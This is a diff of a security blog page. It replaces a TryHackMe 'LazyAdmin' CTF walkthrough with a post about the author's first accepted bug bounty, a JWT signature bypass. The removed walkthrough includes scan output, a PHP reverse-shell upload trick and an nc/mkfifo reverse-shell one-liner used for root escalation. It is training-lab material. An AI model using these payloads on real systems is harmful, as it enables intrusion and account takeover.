@@ -11,7 +11,7 @@
 
 
 
-    <title>Lazy Admin Write Up</title>
+    <title>My first accepted bug bounty</title>
     <meta name="HandheldFriendly" content="True" />
     <meta name="viewport" content="width=device-width, initial-scale=1.0" />
     <!-- Styles'n'Scripts -->
@@ -36,30 +36,30 @@
     <!-- This tag outputs SEO meta+structured data and other important settings -->
     <meta name="description" content="Infosec | Hacking | CTF" />
     <link rel="shortcut icon" href="https://darrynbrownfield.co.uk/assets/images/favicon.png" type="image/png" />
-    <link rel="canonical" href="https://darrynbrownfield.co.uk/lazyadmin" />
+    <link rel="canonical" href="https://darrynbrownfield.co.uk/firstbugbounty" />
     <meta name="referrer" content="no-referrer-when-downgrade" />
 
      <!--title below is coming from _includes/dynamic_title-->
     <meta property="og:site_name" content="Darryn Brownfield" />
     <meta property="og:type" content="website" />
-    <meta property="og:title" content="Lazy Admin Write Up" />
-    <meta property="og:description" content="Overview lazyadmin is a fun easy rated CTF room on TryHackMe. Nmap I deployed the machine and was given the target IP 10.10.86.223. I started a NMAP scan to check the available ports. └──╼ $sudo nmap -sC -sV -oA nmap/initial 10.10.86.223 Starting Nmap 7.80 ( https://nmap.org ) at 2021-05-05 16:22" />
-    <meta property="og:url" content="https://darrynbrownfield.co.uk/lazyadmin" />
-    <meta property="og:image" content="https://darrynbrownfield.co.uk/assets/images/lazyadmin/cover.png" />
+    <meta property="og:title" content="My first accepted bug bounty" />
+    <meta property="og:description" content="Overview In this short blog post, I am going to explain how I found my first accepted bug, what the vulnerability was and my advice to people starting their journey in to the world of bug hunting. Background To be clear I am not an experienced bug hunter. For the" />
+    <meta property="og:url" content="https://darrynbrownfield.co.uk/firstbugbounty" />
+    <meta property="og:image" content="https://darrynbrownfield.co.uk/assets/images/firstbugbounty/cover.png" />
     <meta property="article:publisher" content="https://www.facebook.com/" />
     <meta property="article:author" content="https://www.facebook.com/" />
-    <meta property="article:published_time" content="2021-05-05T00:00:00+00:00" />
-    <meta property="article:modified_time" content="2021-05-05T00:00:00+00:00" />
-    <meta property="article:tag" content="Tryhackme" />
+    <meta property="article:published_time" content="2022-10-01T00:00:00+00:00" />
+    <meta property="article:modified_time" content="2022-10-01T00:00:00+00:00" />
+    <meta property="article:tag" content="Bugbounty" />
     <meta name="twitter:card" content="summary_large_image" />
-    <meta name="twitter:title" content="Lazy Admin Write Up" />
-    <meta name="twitter:description" content="Overview lazyadmin is a fun easy rated CTF room on TryHackMe. Nmap I deployed the machine and was given the target IP 10.10.86.223. I started a NMAP scan to check the available ports. └──╼ $sudo nmap -sC -sV -oA nmap/initial 10.10.86.223 Starting Nmap 7.80 ( https://nmap.org ) at 2021-05-05 16:22" />
+    <meta name="twitter:title" content="My first accepted bug bounty" />
+    <meta name="twitter:description" content="Overview In this short blog post, I am going to explain how I found my first accepted bug, what the vulnerability was and my advice to people starting their journey in to the world of bug hunting. Background To be clear I am not an experienced bug hunter. For the" />
     <meta name="twitter:url" content="https://darrynbrownfield.co.uk/" />
-    <meta name="twitter:image" content="https://darrynbrownfield.co.uk/assets/images/lazyadmin/cover.png" />
+    <meta name="twitter:image" content="https://darrynbrownfield.co.uk/assets/images/firstbugbounty/cover.png" />
     <meta name="twitter:label1" content="Written by" />
     <meta name="twitter:data1" content="Darryn Brownfield" />
     <meta name="twitter:label2" content="Filed under" />
-    <meta name="twitter:data2" content="Tryhackme" />
+    <meta name="twitter:data2" content="Bugbounty" />
     <meta name="twitter:site" content="@dazbrownfield" />
     <meta name="twitter:creator" content="@dazbrownfield" />
     <meta property="og:image:width" content="1400" />
@@ -74,18 +74,18 @@
         "name": "Darryn Brownfield",
         "logo": "https://darrynbrownfield.co.uk/assets/images/blog-icon.png"
     },
-    "url": "https://darrynbrownfield.co.uk/lazyadmin",
+    "url": "https://darrynbrownfield.co.uk/firstbugbounty",
     "image": {
         "@type": "ImageObject",
-        "url": "https://darrynbrownfield.co.uk/assets/images/lazyadmin/cover.png",
+        "url": "https://darrynbrownfield.co.uk/assets/images/firstbugbounty/cover.png",
         "width": 2000,
         "height": 666
     },
     "mainEntityOfPage": {
         "@type": "WebPage",
-        "@id": "https://darrynbrownfield.co.uk/lazyadmin"
+        "@id": "https://darrynbrownfield.co.uk/firstbugbounty"
     },
-    "description": "Overview lazyadmin is a fun easy rated CTF room on TryHackMe. Nmap I deployed the machine and was given the target IP 10.10.86.223. I started a NMAP scan to check the available ports. └──╼ $sudo nmap -sC -sV -oA nmap/initial 10.10.86.223 Starting Nmap 7.80 ( https://nmap.org ) at 2021-05-05 16:22"
+    "description": "Overview In this short blog post, I am going to explain how I found my first accepted bug, what the vulnerability was and my advice to people starting their journey in to the world of bug hunting. Background To be clear I am not an experienced bug hunter. For the"
 }
     </script>
 
@@ -98,7 +98,7 @@
     </script> -->
 
     <meta name="generator" content="Jekyll 3.6.2" />
-    <link rel="alternate" type="application/rss+xml" title="Lazy Admin Write Up" href="/feed.xml" />
+    <link rel="alternate" type="application/rss+xml" title="My first accepted bug bounty" href="/feed.xml" />
 
 
 </head>
@@ -208,215 +208,85 @@ into the {body} of the default.hbs template -->
 <main id="site-main" class="site-main outer" role="main">
     <div class="inner">
 
-        <article class="post-full  tag-tryhackme tag-ctf tag-easy post ">
+        <article class="post-full  tag-bugbounty tag-synack post ">
 
             <header class="post-full-header">
                 <section class="post-full-meta">
-                    <time class="post-full-meta-date" datetime=" 5 May 2021"> 5 May 2021</time>
+                    <time class="post-full-meta-date" datetime=" 1 October 2022"> 1 October 2022</time>
                     
                         <span class="date-divider">/</span>
                         
                             
-                               <a href='/tag/tryhackme/'>TRYHACKME</a>,
+                               <a href='/tag/bugbounty/'>BUGBOUNTY</a>,
                             
                         
                             
-                               <a href='/tag/ctf/'>CTF</a>,
-                            
-                        
-                            
-                               <a href='/tag/easy/'>EASY</a>
+                               <a href='/tag/synack/'>SYNACK</a>
                             
                         
                     
                 </section>
-                <h1 class="post-full-title">Lazy Admin Write Up</h1>
+                <h1 class="post-full-title">My first accepted bug bounty</h1>
             </header>
 
             <section class="post-full-content">
                 <div class="kg-card-markdown">
-                    <p><img src="/assets/images/lazyadmin/cover.png" alt="cover" /></p>
+                    <p><img src="/assets/images/firstbugbounty/cover.png" alt="cover" /></p>
 
 <h3 id="overview">Overview</h3>
+<p>In this short blog post, I am going to explain how I found my first accepted bug, what the vulnerability was and my advice to people starting their journey in to the world of bug hunting.</p>
 
-<p><a href="https://tryhackme.com/room/lazyadmin">lazyadmin</a> is a fun easy rated CTF room on <a href="https://tryhackme.com">TryHackMe</a>.</p>
+<h3 id="background">Background</h3>
+<p>To be clear I am not an experienced bug hunter. For the past few years I have been studying and learning as much as I can about ethical hacking to obtain a role as a full time penetration tester which I’m pleased to say I have achieved starting October 2022. I completed my OSCP in 2020, CRTP in 2021 and will hopefully take the Burp Suite exam and TCM’s PNPT exam this year (2022).</p>
 
-<h3 id="nmap">Nmap</h3>
+<p>My experience in bug bounty is very limited, I successfully became a member of the Synack Red Team in May 2022 and have slowly been spending more and more time on the platform to find vulnerabilities. I have to say <a href="https://www.synack.com">Synack</a> have been amazing, its a great platform to work on with a fantastic community of people.</p>
 
-<p>I deployed the machine and was given the target IP 10.10.86.223. I started a NMAP scan to check the available ports.</p>
+<h3 id="the-bug">The bug!</h3>
+<p>The bug I found was a actually very simple, a JWT authentication bypass via unverified signature. The first thing I do when looking at a target is just navigate around the application and click all the buttons, links etc with my traffic being proxies through Burp. Then once I have an understanding about the target and the functionally I review my Burp history and see if I can spot any interesting requests or parameters.</p>
 
-<pre><code class="language-highlight">└──╼ $sudo nmap -sC -sV -oA nmap/initial 10.10.86.223
-Starting Nmap 7.80 ( https://nmap.org ) at 2021-05-05 16:22 BST
-Nmap scan report for 10.10.86.223
-Host is up (0.028s latency).
-Not shown: 998 closed ports
-PORT   STATE SERVICE VERSION
-22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
-| ssh-hostkey: 
-|   2048 49:7c:f7:41:10:43:73:da:2c:e6:38:95:86:f8:e0:f0 (RSA)
-|   256 2f:d7:c4:4c:e8:1b:5a:90:44:df:c0:63:8c:72:ae:55 (ECDSA)
-|_  256 61:84:62:27:c6:c3:29:17:dd:27:45:9e:29:cb:90:5e (ED25519)
-80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
-|_http-server-header: Apache/2.4.18 (Ubuntu)
-|_http-title: Apache2 Ubuntu Default Page: It works
-Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+<p>For this bug I noticed after I logged in a JWT token is sent via a POST request to the target. I decoded the JWT and replaced my username with another username. I then re-encoded the token and forwarded the request. To my surprise I was now logged in as the replacement username essentially allowing me to login in as anyone with a registered username on the platform.</p>
 
-Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
-Nmap done: 1 IP address (1 host up) scanned in 8.99 seconds
-</code></pre>
+<p>At this point the adrenaline kicked in, I was so excited, my first legitimate vulnerability! It was about 11:30pm, I had work at 9am the next day but I wanted to be sure of my finding. I must have tested the bypass about 10 times with 4 different user accounts to be sure. I reported my findings around 1am and went to bed.</p>
 
-<p>2 Ports open:</p>
+<p>After what felt like a lifetime, I finally I got confirmation from Synack my vulnerability was accepted!</p>
+
+<p>A great resource for learning about JWT attacks is on <a href="https://portswigger.net/web-security/jwt">Port Swigger Academy</a>.</p>
+
+<h3 id="recommendations">Recommendations</h3>
+<p>I am just starting out on this bug bounty journey but I wanted to share the recommendations and resources I have found useful. Before hunting for your first bugs, study! Learn the common vulnerabilities, understand the <a href="https://owasp.org/www-project-top-ten/">OWASP top 10</a>. Complete CTF challenges to get the hands on experience of using tools like Burp and practice finding and exploiting vulnerabilities.</p>
+
+<p>There is no quick fix or miracle methodology. You simple need to put in the hard work, the time in front of the computer and practice and preserver. I have seen lots of people ask, “how do I find my first bug” or say “I cant find any bugs”. I have been there, for months I couldn’t find anything but don’t give up, keep trying and eventually you will find one…. YOU GOT THIS!!</p>
+
+<blockquote>
+  <p>YOU GOT THIS!</p>
+</blockquote>
+
+<p>My list of recommended learning material is:</p>
 
 <ul>
-  <li>22 - SSH - OpenSSH 7.2p2 Ubuntu</li>
-  <li>80 - HTTP - Apache web server version 2.4.18</li>
+  <li><a href="https://portswigger.net/web-security">Port Swigger Academy</a></li>
+  <li><a href="https://www.udemy.com/course/intro-to-bug-bounty-by-nahamsec/">Nahamsec Bug Bounty Course</a></li>
+  <li><a href="https://github.com/jhaddix/tbhm">Jason Haddix The Bug Hunter’s Methodology (TBHM)</a></li>
+  <li><a href="https://www.youtube.com/channel/UCAndnmvdiphDqLLDrGnBuhA/about">PhD Security</a></li>
+  <li><a href="https://www.youtube.com/c/JohnHammond010">John Hammond</a></li>
+  <li><a href="https://www.amazon.co.uk/Bug-Bounty-Bootcamp-Reporting-Vulnerabilities/dp/1718501544">Bug Bounty Bootcamp</a></li>
+  <li><a href="https://tryhackme.com">Tryhackme</a></li>
+  <li><a href="https://www.hackthebox.com">Hackthebox</a></li>
+  <li><a href="https://academy.tcm-sec.com">TCM Security Academy</a></li>
 </ul>
 
-<p>I also ran a full port scan but no additional ports were found.</p>
+<h3 id="next-steps">Next steps…</h3>
+<p>Find more bugs….. :) I have now been bitten by the bug (pun intended) and want to find more. There is still a lot more to learn and bugs to find and looking forward to see what the journey holds.</p>
 
-<h3 id="enumeration">Enumeration</h3>
-
-<p>Opening the webpage just provides a default apache page, I checked the source code and tried robots.txt but didn’t find anything so ran a gobuster. Straight away I got a hit for ‘/content’.</p>
-
-<pre><code class="language-highlight">└──╼ $gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://10.10.86.223 -t 75 -o gobuster.log
-===============================================================                                                                
-Gobuster v3.0.1                                                                                                                
-by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@_FireFart_)                                                                
-===============================================================
-[+] Url:            http://10.10.86.223
-[+] Threads:        75
-[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
-[+] Status codes:   200,204,301,302,307,401,403
-[+] User Agent:     gobuster/3.0.1
-[+] Timeout:        10s
-===============================================================
-2021/05/05 16:26:03 Starting gobuster
-===============================================================
-/content (Status: 301)
-[SNIP]
-</code></pre>
-
-<p>Navigating to ‘http://10.10.86.223/content’ appears to be another default page but this time revealing the server is running SweetRice CMS.</p>
-
-<p><img src="/assets/images/lazyadmin/webpage.png" alt="webpage" /></p>
-
-<p>I ran a gobuster in the background while clicking around. I didnt find anything of interest, however gobuster found a few directories to review.</p>
-
-<pre><code class="language-highlight">└──╼ $gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://10.10.86.223/content/ -t 75 -o gobuster-sweetrice.log
-===============================================================
-Gobuster v3.0.1
-by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@_FireFart_)
-===============================================================
-[+] Url:            http://10.10.86.223/content/
-[+] Threads:        75
-[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
-[+] Status codes:   200,204,301,302,307,401,403
-[+] User Agent:     gobuster/3.0.1
-[+] Timeout:        10s
-===============================================================
-2021/05/05 16:33:33 Starting gobuster
-===============================================================
-/images (Status: 301)
-/js (Status: 301)
-/inc (Status: 301)
-/as (Status: 301)
-/_themes (Status: 301)
-/attachment (Status: 301)
-===============================================================
-2021/05/05 16:35:02 Finished
-===============================================================
-</code></pre>
-
-<p>‘http://10.10.86.223/content/as’ took me to a login page, I tried some default credentials but couldnt log in. Looking around the folders ‘/inc/mysql_backup/’ looks interesting and in the folder is a single backup file.</p>
-
-<p><img src="/assets/images/lazyadmin/mysql.png" alt="mysql" /></p>
-
-<p>The file is readable with cat, looking through I found a user account and password hash. Using the tool ‘hash-identifier’ the hash is md5. Because its md5 I used <a href="https://crackstation.net">crackstation</a> rather than hashcat and got a hit.</p>
-
-<p>Using the credentials from the mysql backup file and the cracked password I was able to login to ‘http://10.10.86.223/content/as’</p>
-
-<p><img src="/assets/images/lazyadmin/sweetrice.png" alt="sweetrice" /></p>
-
-<h3 id="initial-access">Initial Access</h3>
-
-<p>Once logged in, I could clearly see the SweetRice version of 1.5.1, googling ‘sweetrice 1.5.1 exploit’ I found an <a href="https://www.exploit-db.com/exploits/40716">exploit</a> using the upload feature. The exploit is just a simple python script doing a POST call to ‘/as/?type=media_center&amp;mode=upload’.</p>
-
-<p>Rather than use the exploit code I navigated to the ‘Media Center’ part of the website so I could upload a file.</p>
-
-<p>I copied a php reverse shell from /usr/share/webshells/php from my ParrotOS and renamed to shell.php and updated the IP and port details.</p>
-
-<p><img src="/assets/images/lazyadmin/upload.png" alt="upload" /></p>
-
-<p>However, shell.php didn’t work, I didn’t get an error it just didn’t upload, I renamed to shell.php5 and tried to upload again and it worked. I clicked the uploaded file and got a shell.</p>
-
-<pre><code class="language-highlight">└──╼ $nc -nvlp 4444
-listening on [any] 4444 ...
-connect to [SNIP] from (UNKNOWN) [10.10.86.223] 38212
-Linux THM-Chal 4.15.0-70-generic #79~16.04.1-Ubuntu SMP Tue Nov 12 11:54:29 UTC 2019 i686 i686 i686 GNU/Linux
- 18:52:05 up 33 min,  0 users,  load average: 0.00, 0.00, 0.06
-USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
-uid=33(www-data) gid=33(www-data) groups=33(www-data)
-/bin/sh: 0: can't access tty; job control turned off
-$ 
-</code></pre>
-
-<h3 id="priv-esc">Priv Esc</h3>
-
-<p>The first thing I checked was sudo -l and found the www-data was able to run a perl script as sudo with no password.</p>
-
-<pre><code class="language-highlight">$ sudo -l
-Matching Defaults entries for www-data on THM-Chal:
-    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
-
-User www-data may run the following commands on THM-Chal:
-    (ALL) NOPASSWD: /usr/bin/perl /home/itguy/backup.pl
-$ 
-</code></pre>
-
-<p>I checked the script permissions and I was not able to edit the script however I could read it.</p>
-
-<pre><code class="language-highlight">$ ls -lah /home/itguy/backup.pl
--rw-r--r-x 1 root root 47 Nov 29  2019 /home/itguy/backup.pl
-</code></pre>
-
-<p>I stabilised my shell using python and started reviewing the script. It looks like the script calls another script so I again checked the permissions and I can edit this file.</p>
-
-<pre><code class="language-highlight">www-data@THM-Chal:/home/itguy$ cat /home/itguy/backup.pl
-#!/usr/bin/perl
-
-system("sh", "/etc/copy.sh");
-www-data@THM-Chal:/home/itguy$
-www-data@THM-Chal:/home/itguy$ ls -lah /etc/copy.sh
--rw-r--rwx 1 root root 81 Nov 29  2019 /etc/copy.sh
-www-data@THM-Chal:/home/itguy$
-www-data@THM-Chal:/home/itguy$ cat /etc/copy.sh 
-rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 192.168.0.190 5554 &gt;/tmp/f
-</code></pre>
-
-<p>The /etc/copy.sh script has a nc reverse shell payload, I replaced the command with my own IP and port details  and ran the perl script as sudo.</p>
-
-<pre><code class="language-highlight">www-data@THM-Chal:/home/itguy$ echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc IP 5555 &gt;/tmp/f" &gt; /etc/copy.sh
-www-data@THM-Chal:/home/itguy$
-www-data@THM-Chal:/home/itguy$ sudo /usr/bin/perl /home/itguy/backup.pl
-</code></pre>
-
-<p>Root shell!</p>
-
-<pre><code class="language-highlight">└──╼ $nc -nvlp 5555
-listening on [any] 5555 ...
-connect to [SNIP] from (UNKNOWN) [10.10.86.223] 49536
-# id
-uid=0(root) gid=0(root) groups=0(root)
-</code></pre>
+<p>I hope to release more blog posts soon with further bug report write ups and tips and tricks I learn along the way.</p>
 
 <p>Thanks for reading!</p>
 
-<p>============================================================</p>
+<p>==========================================================================</p>
 
 <p>Any comments or feedback welcome! You can find me on <a href="https://twitter.com/dazbrownfield">twitter</a>.</p>
 
 <p><a href="https://www.buymeacoffee.com/dazbrownfield" target="_blank"><img src="https://cdn.buymeacoffee.com/buttons/v2/default-blue.png" alt="Buy Me A Coffee" style="height: 60px !important;width: 217px !important;" /></a></p>
-
 
                 </div>
             </section>
